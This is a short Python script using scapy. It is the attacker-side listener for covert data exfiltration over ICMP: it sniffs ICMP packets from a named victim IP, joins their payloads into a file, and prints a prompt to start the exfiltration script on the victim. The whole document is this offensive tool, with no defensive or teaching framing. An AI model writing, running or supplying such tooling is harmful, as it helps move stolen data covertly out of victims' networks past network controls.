#!/usr/bin/python
# recieve the exfiltrated data via ICMP
#
import sys
from scapy.all import sniff

fileName=sys.argv[1]
victimIP=sys.argv[2]
print "[+] Waiting for data from: "+victimIP
print "[+] Writing to file: "+fileName
print "[+] Begin exfiltration script on victim now ..."
data=sniff(filter="icmp and host "+victimIP,count=5)
token=0
fileData="" # placeholder for the string of data
for packet in data: # loop through packets and concatenate the data
    fileData+=packet["Raw"].load
fh=open(fileName,"w") # overwrite it
fh.write(fileData)
fh.close() # close it up
